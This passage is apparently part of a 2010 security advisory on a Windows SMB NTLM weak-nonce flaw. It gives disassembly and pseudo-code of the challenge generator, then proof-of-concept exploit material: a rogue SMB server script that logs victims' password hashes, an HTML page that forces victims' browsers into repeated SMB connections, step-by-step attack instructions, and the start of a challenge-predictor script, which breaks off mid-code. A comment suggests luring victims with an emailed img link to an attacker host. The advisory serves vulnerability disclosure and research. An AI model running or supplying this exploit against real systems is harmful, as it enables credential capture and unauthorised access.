-->\r\n</SCRIPT>\r\n</BODY>\r\n</HTML>\r\n\r\n6.5.Predicting challenges\r\n\r\n\tThe challenge/nonce prediction attack is feasible due to several factors including that the protocol leaks information that can be used by an attacker to calculate the internal state of the PRNG used to generate challenges.\r\n\tIn order to explain the attack implemented next we begin by explaining the method used by the Windows SMB service to generate challenges.\r\n\r\n6.5.1.SMB service: challenge generation process\r\n\r\n\t(Note: during this explanation we are going to use the code for the Windows XP version of all modules mentioned. The code is the same in all platforms with some minor differences for some platforms but these differences do not produce a different behaviour).\r\n\tThe function that generates the challenges returned in \'SMB Negotiate Protocol Response\' packets is srv.sys!GetEncryptionKey(): \r\n\r\n\tIt takes the current time, and adds to the low part of the current time the value of the\r\n\tglobal variable _EncryptionKeyCount.\r\n\r\n\t00040735                 lea     eax, [ebp+CurrentTime]\r\n\t00040738                 push    eax             \r\n\t00040739                 call    ds:__imp__KeQuerySystemTime@4 \r\n\t0004073F                 mov     eax, _EncryptionKeyCount\r\n\t00040744                 add     dword ptr [ebp+CurrentTime], eax\r\n\r\n\r\n\tIncrements _EncryptionKeyCount by 0x100 and makes some \'calculations\' \r\n\twith the (current time.lowpart + _EncryptionKeyCount) resulting in a DWORD value with the\r\n\tfollowing \'pattern\': \r\n\r\n\t\t\twhere CT = (current time.lowpart + _EncryptionKeyCount)\r\n\r\n\t\t\t\tseed = CT[1], CT[2]-1, CT[2], CT[1]+1;\r\n\r\n\r\n\t00040747                 movzx   ecx, byte ptr [ebp+CurrentTime+1]\r\n\t0004074B                 movzx   eax, byte ptr [ebp+CurrentTime+2]\r\n\t0004074F                 add     _EncryptionKeyCount, 100h\r\n\t00040759                 mov     edx, ecx\r\n\t0004075B                 shl     edx, 8\r\n\t0004075E                 lea     esi, [eax-1]\r\n\t00040761                 or      edx, esi\r\n\t00040763                 mov     esi, ds:__imp__RtlRandom@4 \r\n\t00040769                 shl     edx, 8\r\n\t0004076C                 or      edx, eax\r\n\t0004076E                 shl     edx, 8\r\n\t00040771                 inc     ecx\r\n\t00040772                 lea     eax, [ebp+Seed]\r\n\t00040775                 or      edx, ecx\r\n\r\n\tThen it calls the ntoskrnl.exe!RtlRandom(&seed) function three times, using\r\n\tas a \'seed\' the value with the pattern shown above. Each call to ntosrnkl.exe!RtlRandom(&seed)\r\n\treturns in \'seed\' a different value (meaning each call does not use the same value as a \'seed\').\r\n\r\n\t00040777                 push    eax             \r\n\t00040778                 mov     [ebp+Seed], edx\r\n\t0004077B                 call    esi ; RtlRandom(x) \r\n\t0004077D                 mov     [ebp+var_18], eax\r\n\t00040780                 lea     eax, [ebp+Seed]\r\n\t00040783                 push    eax             \r\n\t00040784                 call    esi \t\t\t\t; RtlRandom(x) \r\n\t00040786                 mov     ebx, eax\r\n\t00040788                 lea     eax, [ebp+Seed]\r\n\t0004078B                 push    eax      \t\t       ; Seed\r\n\t0004078C                 call    esi \t\t               ; RtlRandom(x) \r\n\r\n\tThe calls to ntoskrnl.exe!RtlRandom(&seed) generate 3 \'random\' numbers.\r\n\tBased on the value of random_number3, random_number1 and random_number2 are\r\n\tmodified:\r\n\r\n\t0004078E                 test    al, 1\r\n\t00040790                 mov     ecx, 80000000h\r\n\t00040795                 jz      short loc_4079A\r\n\t00040797                 or      [ebp+var_18], ecx\r\n\t0004079A\r\n\t0004079A loc_4079A:                              \r\n\t0004079A                 test    al, 2\r\n\t0004079C                 jz      short loc_407A0\r\n\t0004079E                 or      ebx, ecx\r\n\t000407A0\r\n\t000407A0 loc_407A0:                              \r\n\r\n\tFinally, the code returns the challenge in the form bytes(random_number1, random_number2)\r\n\r\n\t000407A0                 mov     eax, [ebp+var_18]\r\n\t000407A3                 mov     ecx, [ebp+var_4]\r\n\t000407A6                 mov     [edi+4], ebx\r\n\t000407A9                 mov     [edi], eax\r\n\t000407AB                 pop     edi\r\n\t000407AC                 pop     esi\r\n\t000407AD                 pop     ebx\r\n\t000407AE                 call    @__security_check_cookie@4 \r\n\t000407B3                 leave\r\n\t000407B4                 retn    4\r\n\r\n\tNext is pseudo-code for the function srv.sys!GetEncryptionKey():\r\n\t\r\n\r\n\t// Global Variable\r\n\tDWORD _EncryptionKeyCount = 0;\r\n\r\n\tsrv.sys!GetEncryptionKey(byte OUT *pChallenge)\r\n\t{\r\n\tLARGE_INTEGER currentTime;\r\n\tDWORD seed;\r\n\tDWORD random_number1, random_number2, random_number3;\r\n\r\n\r\n\t\tKeQuerySystemTime(&CurrentTime);\r\n\t\tCurrentTime.LowPart += _EncryptionKeyCount;\r\n\r\n\t\t_EncryptionKeyCount += 0x100;\r\n\r\n\t\tCT = CurrentTime.LowPart;\r\n\r\n\t\tseed = CT[1], CT[2]-1, CT[2], CT[1]+1;\r\n\r\n\t\trandom_number1 = ntoskrnl.exe!RtlRandom(&seed);\r\n\t\trandom_number2 = ntoskrnl.exe!RtlRnadom(&seed);\r\n\t\trandom_number3 = ntoskrnl.exe!RtlRandom(&seed);\r\n\r\n\r\n\t\tif ( (random_number3 & 1) == 1) {\r\n\t\t\trandom_number1 |= 0x80000000\r\n\t\t} \r\n\r\n\t\tif( (random_number3 & 2) == 2 ) {\r\n\t\t\trandom_number2 |=  0x80000000\r\n\t\t}\r\n\r\n\t\t*pChallenge =  bytes(random_number1, random_number2);\r\n\t}\r\n\r\n\tThe code for ntoskrnl.exe!RtlRandom(&seed) is the following:\r\n\r\n\tIt receives the seed and performs the following calculations:\r\n\r\n\t\tX0 = *seed;\r\n\t\tX1 = (a*X0 + b ) mod m\r\n\t\twhere:\r\n\t\t\ta = 0x7FFFFFED\r\n\t\t\tb = 0x7FFFFFC3\r\n\t\t\tm = 0x7FFFFFFF\r\n\t\r\n\t004B5B75                 mov     edi, edi\r\n\t004B5B77                 push    ebp\r\n\t004B5B78                 mov     ebp, esp\r\n\t004B5B7A                 push    ebx\r\n\t004B5B7B                 push    esi\r\n\t004B5B7C                 mov     esi, [ebp+Seed]\r\n\t004B5B7F                 mov     eax, [esi]\r\n\t004B5B81                 imul    eax, 7FFFFFEDh\r\n\t004B5B87                 push    edi\r\n\t004B5B88                 mov     ecx, 7FFFFFC3h\r\n\t004B5B8D                 add     eax, ecx\r\n\t004B5B8F                 mov     edi, 7FFFFFFFh\r\n\t004B5B94                 xor     edx, edx\r\n\t004B5B96                 mov     ebx, edi\r\n\t004B5B98                 div     ebx\r\n\r\n\t\tWith the X1 value performs similar calculations:\r\n\r\n\t\tX2 = (a*X1 + b) mod m\r\n\r\n\t004B5B9A                 mov     ebx, edx\r\n\t004B5B9C                 mov     eax, edx\r\n\t004B5B9E                 imul    eax, 7FFFFFEDh\r\n\t004B5BA4                 add     eax, ecx\r\n\t004B5BA6                 xor     edx, edx\r\n\t004B5BA8                 div     edi\r\n\r\n\tIt sets the value of seed to X2\r\n\r\n\t004B5BAA                 pop     edi\r\n\t004B5BAB                 mov     [esi], edx\r\n\r\n\tit calculates  (X2 & 0x7F) to generate an index for the _RtlpRandomConstantVector\r\n\r\n\t004B5BAD                 and     edx, 7Fh\r\n\t004B5BB0                 lea     ecx, _RtlpRandomConstantVector[edx*4]\r\n\r\n\tand finally fetches the value found at the previously calculated index, and also\r\n\tstores the value of X1 in that position.\r\n\r\n\t004B5BB7                 mov     eax, [ecx]\r\n\t004B5BB9                 pop     esi\r\n\t004B5BBA                 mov     [ecx], ebx\r\n\r\n\t\r\n\tNext is pseudo-code for the function ntoskrnl.exe!RtlRandom:\r\n\r\n\t// Global variable\r\n\tDWORD ntoskrnl.exe!RtlpRandomConstantVector [128] = {...} \r\n\r\n\tDWORD ntoskrnl.exe!RtlRandom(DWORD *pseed)\r\n\t{\r\n \tDWORD a = 0x7FFFFFED;\r\n\tDWORD b = 0x7FFFFFC3;\r\n\tDWORD m = 0x7FFFFFFF;\r\n\tDWORD X0, X1, X2;\r\n\r\n\t\tX0 = *pseed;\r\n\t\tX1 = ( a*X0 + b ) mod m\r\n\t\tX2 = ( a*X1 + b ) mod m\r\n\t\t*pseed = X2;\r\n\t\tndx = X2 & 0x7F;\r\n\t\tn = RtlpRandomConstantVector[ndx];\r\n\t\tRtlpRandomConstantVector[ndx] = X1;\r\n\t\treturn n;\r\n\t}\r\n\r\n\tIn Summary,\r\n\t\r\n\tThe srv.sys!GetEncryptionKey() does the following:\r\n\t\t- Gets current time, takes the low part (4 bytes) and adds the value of _EncryptionKeyCount (4-bytes)\r\n\t\t- Increments _EncryptionKeyCount by 0x100\r\n\t\t- Takes the two \'middle\' bytes of CT=(current time.lowpart + _EncryptionKeyCount) and creates\r\na seed with the form CT[1], CT[2]-1, CT[2], CT[1]+1.\r\n\t\t-  Calls ntoskrnl.exe!RtlRandom three times and obtains three random numbers (random1,random2,random3)\r\n\t\t-  Depending on the value of random3, makes some modifications to random1 and random2\r\n\t\t-  creates the challenge by creating an array of bytes in the form random1, random2\r\n\r\n\tThe ntoskrnl.exe!RtlRandom function appears to be a Maclaren-Marsaglia PRNG algorithm using two LCGs (linear congruential generators) [4] with a vector of 128 bytes.\r\n\r\n\t\tWe know the following facts:\r\n\r\n\t\t\t- _EncryptionKeyCount starts with a value of 0\r\n\t\t\t- _EncryptionKeyCount is only modified by srv.sys!GetEncryptionKey. The code that calls srv.sys!GetEncryptionKey() is not regularly triggered, but only when the SMB service receives a packet like the one we use with the \'flags2\' field set to 0xc001\r\n\t\t\t- We have not observed \'modern\' Windows systems (Windows XP SP3, Vista, 7, etc) generate these kind of packets\r\n\t\t\t- This allows us to expect that before start conducting an attack against any \'modern\' Windows system, _EncryptionKeyCount will always be 0; by keeping count of the number of packets we send, we can also calculate the value of _EncryptionKeyCount for further connections\r\n\t\t\t- Interestingly enough, in our tests, the value of Current Time used by srv.sys!GetEncryptionKey to generate the seed was the same value returned by the SMB service to the client in the field \'System Time\' of an \'SMB Negotiate Protocol Response\' packet\r\n\t\t\t- The initial state of the vector used by ntoskrnl.exe!RtlRandom is hard-coded, but it is modified every time the function is called and it is called every time a new process is created (modifications might not be that many).\r\n\r\n\t\tBased on these facts we implemented the following attack to predict challenges:\r\n\r\n\t\t- We set the vector used by ntoskrnl.exe!RtlRandom to a \'known state\' \r\n\t\t\t-To do this we send multiple \'SMB Negotiate Protocol Request\' packets with the \'flags2\' field set to 0xc001 to trigger srv.sys!GetEncryptionKey which in turns calls ntoskrnl.exe!RtlRandom modifying its internal vector (~300 packets)\r\n\t\t\t-Since we know the seed used by the server to perform the previous actions, because it is in the \'System Time\' field of the \'SMB Negotiate Protocol Response\' packet we receive, and we also know all the other variables including the value of _EncryptionKeyCount, we can do the same calculations updating our own vector\r\n\t\t\t-We repeat this process until all 128 values of our vector are calculated. At this point we know the state of the table on the remote system, we know all of its values and their position within the vector.\r\n\r\n\r\n\t\t- We calculate all possible challenges that can be generated with that \'known state\' next time srv.sys!GetEncryptionKey is called\r\n\t\t- We force the victim to connect to our specially crafted SMB server to get all those challenges encrypted with the credentials of the victim (an average of ~16000 to ~48000 possible challenges)\r\n\t\t- At this point we know that if we send another authentication request to the victim the challenge returned will be one of the pre-calculated challenges. We make the connection, get the challenge, look for the corresponding response we obtained from the victim, and authenticate to the SMB service.\r\n\r\n6.5.2.Proof-of-Concept Exploit\r\n------------------------------\r\n\r\nNext are the necessary steps to perform the attack:\r\n\r\n\t\t- Run predictor.rb against the victim. E.g.: ruby predictor.rb 192.168.1.110\r\n\t\tThis script will show the progress of \'setting\' the values of the victims RtlRandom\'s internal vector.\r\n\t\tIt will display something like this:\r\n\r\n\t\t(0x00-0x04) 0x00000000 0x00000000 0x00000000 0x2948d15b\r\n\t\t(0x04-0x08) 0x72f4dda5 0x00000000 0x14dbf86f 0x00000000\r\n\t\t(0x08-0x0c) 0x00000000 0x62d2c31e 0x00000000 0x7ef9db03\r\n\t\t(0x0c-0x10) 0x00000000 0x0dfdee4d 0x00000000 0x0ecd0d97\r\n\t\t(0x10-0x14) 0x00000000 0x04d986e1 0x00000000 0x00000000\r\n\t\t(0x14-0x18) 0x00000000 0x35fdf275 0x00000000 0x00000000\r\n\t\t(0x18-0x1c) 0x00000000 0x47b6b289 0x00000000 0x00000000\r\n\t\t(0x1c-0x20) 0x5b9a7eb8 0x00000000 0x00000000 0x3b150ecc\r\n\t\t(0x20-0x24) 0x146909b1 0x7a3022b1 0x00000000 0x00000000\r\n\t\t(0x24-0x28) 0x23bfb6e0 0x00000000 0x00000000 0x0e5c7c0f\r\n\t\t(0x28-0x2c) 0x3f027a59 0x00000000 0x00000000 0x00000000\r\n\t\t(0x2c-0x30) 0x00000000 0x00000000 0x6a3158d2 0x00000000\r\n\t\t(0x30-0x34) 0x69d97001 0x2cd5c5e6 0x00000000 0x2cdcb5b0\r\n\t\t(0x34-0x38) 0x00000000 0x00000000 0x00000000 0x00000000\r\n\t\t(0x38-0x3c) 0x00000000 0x00000000 0x00000000 0x00000000\r\n\t\t(0x3c-0x40) 0x08deca3d 0x4954003d 0x00000000 0x00f5b207\r\n\t\t(0x40-0x44) 0x4de0efd1 0x00000000 0x00000000 0x56bf3780\r\n\t\t(0x44-0x48) 0x25210c65 0x00000000 0x00000000 0x00000000\r\n\t\t(0x48-0x4c) 0x00000000 0x00000000 0x00000000 0x00000000\r\n\t\t(0x4c-0x50) 0x00000000 0x00000000 0x00000000 0x00000000\r\n\t\t(0x50-0x54) 0x00000000 0x397415a1 0x34aa91eb 0x00000000\r\n\t\t(0x54-0x58) 0x231aeb35 0x00000000 0x00000000 0x00000000\r\n\t\t(0x58-0x5c) 0x00000000 0x04223749 0x00000000 0x1b4c91f8\r\n\t\t(0x5c-0x60) 0x00000000 0x00000000 0x00000000 0x71ad9da7\r\n\t\t(0x60-0x64) 0x00000000 0x00000000 0x00000000 0x046696bb\r\n\t\t(0x64-0x68) 0x00000000 0x00000000 0x193b264f 0x439ef5b4\r\n\t\t(0x68-0x6c) 0x5bdd2f34 0x00000000 0x00000000 0x481eaee3\r\n\t\t(0x6c-0x70) 0x00000000 0x00000000 0x50b1e1f7 0x2a8d71dc\r\n\t\t(0x70-0x74) 0x00000000 0x02240f41 0x0ae7948b 0x37af3d8b\r\n\t\t(0x74-0x78) 0x00000000 0x00000000 0x77130a3a 0x640bf49f\r\n\t\t(0x78-0x7c) 0x31665169 0x20a1c769 0x00000000 0x00000000\r\n\t\t(0x7c-0x80) 0x6958e618 0x00000000 0x00000000 0x00000000\r\n\t\tknown values: 48/128\r\n\r\n\r\n\t- When predictor.rb finishes, it writes the values of the vector to \'x_values.log\' (it also generates a file \'t_values.log\' containing the \'current times\' observed in the \'SMB Negotiate Protocol Response\' packets).\r\n\t- Run generate_challenges.rb, it will generate the file \'challenges.log\' with all the possible challenges based on \'x_values.log\'.\r\n\t- Run savecreds.rb, it will wait for incoming connections on port 445/tcp\r\n\t- On the victim, use \'predict.html\' with Internet Explorer to perform SMB connections to savecreds.rb\'s server\r\n\tYou will need to change the IP address of the server where savecreds.rb is running in \'predict.html\', and\r\n\talso the number of connections to perform (look for the line: \'if (id == 50000) {\' and change accordingly).\r\n\tThe number of connections that need to be performed is shown by savecreds.rb.\r\n\t- When savecreds.rb is finished, a file \'fullcreds.log\' will be created\r\n\t- Now use the metasploit module msf_smb_weak_nonce.rb as explained before with the recently generated \'fullcreds.log\' against the victim\r\n\t- You should be able to authenticate with the victim at the ~first attempt \r\n\r\n\tSometimes the challenge is correctly \'guessed\' at the first attempt, but the attack fails because of some SMB error. If this happens please note that the challenge was indeed correctly predicted. \r\n\tAlso note that since the internal vector is not completely modified after just one connection, the exploit will actually be able to predict more challenges (you might be able to run the metasploit exploit multiple times before performing the whole attack all over again).\r\n\t\r\n\tThe predictor.rb assumes the EncryptionKeyCount is 0. If you want to run the attack multiple times you\r\n\tjust need to modify its value in predictor.rb. The value of EncryptionKeyCount after the attack is displayed by predictor.rb when it terminates (you need to use the value displayed + 0x100).\r\n\r\n\tAfter generate_challenges.rb is executed, if the number of possible challenges is \'too big\' (~48000 or more) you\r\n\tmight want to run predictor.rb again. The size of the set of possible challenges vary according to the values in the vector. Remember to adjust EncryptionKeyCount before running predictor.rb. We recommend peforming the attack when EncryptionKeyCount is 0 specially if this is the first time this proof-of-concept is used.\r\n\r\n\tThis is just a proof-of-concept exploit, it can be improved and optimized.\r\n\r\n====savecreds.rb====:\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\n# (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\r\n# This script waits for incoming connections on port 445/tcp and responds with\r\n# a set to challenges, and stores the responses.\r\n\r\nrequire \'socket\'\r\nrequire \'time\'\r\n\r\n\r\n# from metasploit...\r\n# framework-3.2/lib/rex/proto/smb/utils.rb\r\ndef time_unix_to_smb(unix_time)\r\n\tt64 = (unix_time + 11644473600) * 10000000\r\n\tthi = (t64 & 0xffffffff00000000) >> 32\r\n\ttlo = (t64 & 0x00000000ffffffff)\r\n\treturn [thi, tlo]\r\nend\r\n\r\ndef waitforcreds(thenonces, num)\r\n\r\n\tnonces_ndx =  0\r\n\tconn_num = 0\r\n\tmaxn = num \r\n\r\n\r\n\tneg_proto_response_1 = \r\n\t"00000051" + # NetBIOS Session Service header\r\n\t"ff534d4272000000008801c00000000000000000000000000000fffe00000000" + # SMB Header\r\n\t"1105000302000100041100000000010000000000fde30000007632d28015ca010000080c00e486962656d5869400000000"  # Negotiate Protocol Response\r\n\r\n\tsession_setupandx_access_denied = \r\n\t"00000023" + # NetBIOS Session Service Header\r\n\t"ff534d4273220000c08801c00000000000000000000000000000fffe00000400000000" + # SMB Header\r\n\t"000000" # Session and SetupX Response payload\r\n\r\n\r\n\tcreds_filename = "fullcreds.log"\r\n\r\n \tif File.file?( creds_filename ) then\r\n                File.delete( creds_filename )\r\n        end\r\n\r\n\r\n\tserver = TCPServer.open(445)\r\n\tloop {\r\n\r\n\t\tif conn_num > maxn\r\n\t\t\tThread.exit\r\n\t\t\treturn\r\n\t\tend\r\n\t\r\n\t\tThread.start(server.accept) do |client|\r\n\t\t\r\n\t\t\tconn_num = conn_num + 1\r\n\t\t\tif conn_num > maxn\r\n\t\t\t\tputs "done!"\r\n\t\t\t\tclient.close()\r\n\t\t\t\tserver.shutdown\r\n\t\t\t\tThread.exit\r\n\t\t\t\treturn\r\n\t\t\tend\r\n\t\t\tputs conn_num\r\n\r\n\r\n\t\t\t# (1) receive Negotiate Protocol Request\r\n\r\n\t\t\tq, x = client.recvfrom(2000)\r\n\t\t\tputs "neg proto request received"\r\n\t\t\tpid1 = q[0x1e]\r\n\t\t\tpid2 = q[0x1f]\r\n\t\t\tmulti1 = q[0x1e+4]\r\n\t\t\tmulti2 = q[0x1f+4]\r\n\r\n\t\t\t# (2) send Negotiate Protocol Response\r\n\r\n\t\t\t# set challenge in response packet \r\n\t\t\tputs thenonces[nonces_ndx].to_s\r\n\t\t\tneg_proto_response_1[146..146+15] = thenonces[nonces_ndx].chomp\r\n\t\t\t# TODO: SET CORRECT TIME\r\n\t\t\ttimehi, timelo = time_unix_to_smb(Time.now.to_i)\r\n\t\t\t# send packet \r\n\t\t\tn = neg_proto_response_1.scan(/../).map { |s| s.to_i(16) }\r\n\t\t\t# set process id\r\n\t\t\t#puts pid1\r\n\t\t\t#puts pid2\r\n\t\t\t#puts multi1\r\n\t\t\t#puts multi2\r\n\t\t\tn[0x1e] = pid1\r\n\t\t\tn[0x1f] = pid2\r\n\t\t\tn[0x1e+4] = multi1\r\n\t\t\tn[0x1f+4] = multi2\r\n\t\r\n\t\t\ts = ("%.8x" % timelo)\r\n\t\t\tss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr\r\n\r\n\t\t\tdlo = (ss.scan(/../)).map { |s| s.to_i(16) }\r\n\r\n\t\t\ts = ("%.8x" % timehi)\r\n\t\t\tss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr\r\n\r\n\t\t\tdhi = (ss.scan(/../)).map { |s| s.to_i(16) }\r\n\r\n\t\t\tn[0x3c..0x3c+3] = dlo\r\n\t\t\tn[0x40..0x40+3] = dhi\r\n\r\n\t\t\t# timezone = 0\r\n\t\t\t#n[0x45] = 0\r\n\t\t\t#n[0x46] = 0\r\n\t\t\tj = n.pack("C*")\r\n\t\t\tclient.write(j)\r\n\t\t\tputs "neg proto response sent"\r\n\r\n\t\t\t# (3) Receive Session Setup andX Request\r\n\t\t\tq, x = client.recvfrom(4000)\r\n\t\t\tputs "session setup andx request received!"\r\n\t\t\tpid1 = q[0x1e]\r\n\t\t\tpid2 = q[0x1f]\r\n\t\t\tmulti1 = q[0x1e+4]\r\n\t\t\tmulti2 = q[0x1f+4]\r\n\r\n\t\t\t# we assume the first request is anonymous\r\n\t\t\t# and we send back an Error: STATUS_ACCESS_DENIED\r\n\t\t\tn = session_setupandx_access_denied.scan(/../).map { |s| s.to_i(16) }\r\n\t\t\tn[0x1e] = pid1\r\n\t\t\tn[0x1f] = pid2\r\n\t\t\tn[0x1e+4] = multi1\r\n\t\t\tn[0x1f+4] = multi2\r\n\t\t\t#n[0x44/2] = pid1multi1\r\n\t\t\t#n[0x45/2] = multi2\r\n\t\t\t#n[0x3c/2] = pid1\r\n\t\t\t#n[0x3d/2] = pid2\r\n\t\t\t#puts n\r\n\r\n\t\t\tbegin\r\n\t\t\t\tj = n.pack("C*")\r\n\t\t\trescue\r\n\t\t\t\tputs $! \r\n\t\t\tend\r\n\t\t\r\n\t\t\tclient.write(j)\r\n\t\t\tputs "session setupandx access denied sent!"\r\n\r\n\t\t\t# (4) Receive Session Setup andX Request with creds\r\n\t\t\tq, x = client.recvfrom(4000)\r\n\t\t\tputs "session setup andx request with creds received!"\r\n\r\n\t\t\t# Get the ANSI Password \r\n\t\t\tansi_pwd = q[0x41..0x41+23]\r\n\t\t\tansi_pwd_s = (ansi_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s\r\n\t\t\tputs ansi_pwd_s\r\n\r\n\t\t\t# Get the Unicode Password\r\n\t\t\tunicode_pwd = q[0x59..0x59+23]\r\n\t\t\tunicode_pwd_s = (unicode_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s\r\n\t\t\tputs unicode_pwd_s\r\n\r\n\t\t\t# Get the username (0x71)\r\n\t\t\ti = 0\r\n\t\t\tv = 0\r\n\t\t\tusername = "" \r\n\t\t\twhile v == 0\r\n\t\t\t\tif q[0x71+i] == 0 and q[0x71+i+1] == 0\r\n\t\t\t\t\tv = 1\r\n\t\t\t\tend\r\n\t\t\t\tif q[0x71+i] != 0\r\n\t\t\t\t\tusername = username + q[0x71+i].chr\r\n\t\t\t\tend\r\n\t\t\t\ti = i + 1\r\n\t\t\tend\r\n\r\n\t\t\ti = 0x71 + i + 1\r\n\t\t\tdomain = ""\r\n\t\t\tv = 0\r\n\t\t\tk = 0\r\n\t\t\twhile v == 0:\r\n\t\t\t\tif q[i+k] == 0 and q[i+k+1] == 0\r\n\t\t\t\t\tv = 1\r\n\t\t\t\tend\r\n\t\t\t\tif q[i+k] != 0\r\n\t\t\t\t\tdomain = domain + q[i+k].chr\r\n\t\t\t\tend\r\n\t\t\t\tk = k + 1\r\n\t\t\tend\r\n\r\n\t\t\tputs username\r\n\t\t\tputs domain\r\n\r\n\t\t\tFile.open(creds_filename, "a") { |f| f.write( thenonces[nonces_ndx].to_s + "," + ansi_pwd_s + "," + unicode_pwd_s + "," + username + "," + domain + "\\n") }\r\n\t\r\n\t\t\tclient.close\r\n\t\t\tnonces_ndx = nonces_ndx + 1\r\n\r\n\t\tend\r\n \t}\r\n\r\nend\r\n\r\ndef savecreds()\r\n\r\n\tnonces = []\r\n\tnonces_filename = "challenges.log"\r\n\r\n\t# load nonces to send to the victim \r\n\tdata = ""\r\n\tFile.open(nonces_filename, \'r\') { |f| data = f.read() }\r\n\tnonces = data.split(/\\n/)\r\n\tnum = nonces.length\r\n\tputs "waiting for " + num.to_s + " connections..."\r\n\r\n\t# wait for victim to encrypt the nonces\r\n\twaitforcreds(nonces, num)\r\n\r\nend\r\n\r\n\r\n\r\n# MAIN\r\n\r\n\tprint "Windows SMB NTLM Authentication weak nonce Vulnerability"\r\n\tprint "\\n(c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\\n"\r\n\t\r\n\t# now, we expect connections from the victim\r\n\t# so we can use those connections to have the victim\r\n\t# encrypt the nonces with the hases of his/her password\r\n\t#the connections can be forced by\r\n\t#using the classic technique of sending an email\r\n\t#with link to a web page, a web page that may contain html tags like\r\n\t#<img src="\\\\<attacker>\\pepe">\r\n\t# for each <img> tag the victim will initiate 4 connections (it retries automatically..)\r\n\t# so that\'s good for an attacker, lowers the number of\r\n\t# connections it needs to force from the victim\r\n\r\n\tputs "waiting for connections from victim"\r\n\tsavecreds()\r\n\r\n====predict.html====:\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n</head>\r\n<body>\r\n  <div id="image"></div>\r\n  <div id="efficiency"></div>\r\n  <div id="progress"></div>\r\n  <div id="state"></div>\r\n  <div id="url"></div>\r\n  <div id="text"></div>\r\n  <div id="response"></div>\r\n</body>\r\n</html>\r\n\r\n<script type="text/javascript">\r\n  id = 0\r\n  target_unc = "\\\\\\\\192.168.1.130\\\\c$\\\\j.txt"\r\n  target_http = "http://192.168.1.130/"\r\n  window.onload = function() {\r\n    set_handled_image_element("image", target_unc + id);\r\n  }\r\n\r\n  set_image = function() {\r\n    var target = "";\r\n    if (id % 2 == 1)  {\r\n      target = target_unc;\r\n    } else {\r\n      target = target_http;\r\n    }\r\n    set_handled_image_element("image", target + id);\r\n  }\r\n\r\n  set_text_element = function(id, text) {\r\n    document.getElementById(id).innerHTML = "" +\r\n      "<p>" + \r\n        text +\r\n      "</p>";\r\n  }\r\n\r\n  set_image_element = function(id, image) {\r\n    document.getElementById(id).innerHTML = "" +\r\n      "<img" +\r\n        " src = \'" + image + "\'" +\r\n      " />";\r\n  }\r\n\r\n  set_handled_image_element = function(id, image) {\r\n    document.getElementById(id).innerHTML = "" +\r\n      "<img" +\r\n        " src = \'" + image + "\'" +\r\n        " onLoad = \'image_on_load()\'" +\r\n        " onError = \'image_on_error()\'" +\r\n        " style = \'display: none\'" +\r\n      " />";\r\n  }\r\n\r\n  image_on_load = function() {\r\n    id += 1;\r\n    if (id == 50000) {\r\n      set_image_element("image", "");\r\n      return;\r\n    }\r\n    set_text_element("progress", "attempt: " + id/2);\r\n    set_text_element("image", "image");\r\n    set_image()\r\n  }\r\n\r\n  image_on_error = image_on_load\r\n</script>\r\n\r\n====predictor.rb====:\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\n# Proof-of-concept challenge predictor exploit\r\n# Hernan Ochoa & Agustin Azubel\r\n\r\nrequire \'socket\'\r\n\r\nclass LinearCongruentialGenerator\r\n  def initialize a, b, m\r\n    @a = a\r\n    @b = b\r\n    @m = m\r\n  end\r\n\r\n  def apply x\r\n    y = ( ( ((@a * x) & 0xffffffff) + @b) & 0xffffffff) % @m\r\n  end\r\nend\r\n\r\nclass RtlRandomLinearCongruentialGenerator < LinearCongruentialGenerator\r\n  def initialize\r\n    a = 0x7fffffed # 2 ** 31 - 19\r\n    b = 0x7fffffc3 # 2 ** 31 - 61\r\n    m = 0x7fffffff # 2 ** 31 - 1\r\n    super a, b, m\r\n  end\r\nend\r\n\r\n\r\n\r\nclass SmbSeedGenerator\r\n  def apply t\r\n    # seed = CT[1] || CT[2]-1 || CT[2] || CT[1]+1\r\n    t_1 = (t & 0xffff) >> 8\r\n    t_2 = (t & 0xffffff) >> 16\r\n\r\n    seed = 0;\r\n    seed |= t_1\r\n    seed <<= 8;\r\n\r\n    seed |= t_2 - 1\r\n    seed <<= 8\r\n\r\n    seed |= t_2\r\n    seed <<= 8\r\n\r\n    seed |= t_1 + 1\r\n\r\n    seed\r\n  end\r\nend\r\n\r\n\r\nmodule DumpableValues\r\n  def dump\r\n    File.open "#{@name}.log", "w+" do |f|\r\n      each do |value|\r\n        line = "0x%x" % value\r\n        f.puts line\r\n      end\r\n    end\r\n  end\r\nend\r\n\r\n\r\nclass TValues < Array\r\n  include DumpableValues\r\n  def initialize\r\n    super\r\n    @name = "t_values"\r\n  end\r\nend\r\n\r\n\r\nclass JValues < Array\r\n  include DumpableValues\r\n  def initialize\r\n    super 128, 0\r\n    @name = "j_values"\r\n  end\r\nend\r\n\r\n\r\nclass XValues < Array\r\n  include DumpableValues\r\n  def initialize\r\n    super 128\r\n    @name = "x_values"\r\n    @known_count = 0\r\n  end\r\n\r\n  def show\r\n    system "clear"\r\n    items_per_row = 4\r\n    rows = length/items_per_row\r\n\r\n    (0...rows).each do |row|\r\n      i = row * items_per_row\r\n      print "(0x%02x-0x%02x) " % [ i, i + items_per_row ]\r\n      puts self[ i, items_per_row].map { |value| "0x%08x" % value }.join(" ")\r\n    end\r\n    puts "known values: %d/%d" % [ @known_count, length ]\r\n  end\r\n\r\n  def []= i, x \r\n    @known_count += 1 unless self[i]\r\n    super i, x\r\n  end\r\nend\r\n\r\n\r\nclass RtlRandomAttack\r\n  def initialize host\r\n    @host = host\r\n\r\n    @lcg = RtlRandomLinearCongruentialGenerator.new\r\n    @sg = SmbSeedGenerator.new\r\n\r\n    @encryption_key_count = 0\r\n\r\n    @t_values = TValues.new\r\n    @x_values = XValues.new\r\n    @j_values = JValues.new\r\n    @attempts = 0\r\n    @count = 0\r\n    @max_count = 128\r\n  end\r\n\r\n  def getChallenge\r\n    port = 445\r\n    neg_proto_packet_1 = \r\n\t"00000054" 